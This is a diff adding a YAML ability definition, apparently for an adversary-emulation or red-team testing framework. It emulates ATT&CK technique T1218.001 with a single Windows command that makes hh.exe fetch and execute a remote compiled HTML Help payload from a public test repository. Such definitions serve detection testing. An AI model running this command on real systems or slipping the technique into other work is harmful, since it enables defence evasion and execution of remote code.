@@ -1,0 +1,18 @@
+---
+- id: 6d5da876fe45a933257a96c14c3132f0
+  name: Compiled HTML Help Remote Payload
+  description: 'Uses hh.exe to execute a remote compiled HTML Help payload.
+
+    Upon execution displays an error saying the file cannot be open
+
+    '
+  tactic: stealth
+  technique:
+    attack_id: T1218.001
+    name: 'Signed Binary Proxy Execution: Compiled HTML File'
+  platforms:
+    windows:
+      cmd:
+        command: hh.exe https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218.001/src/T1218.001.chm
+        payloads: []
+        cleanup: ''
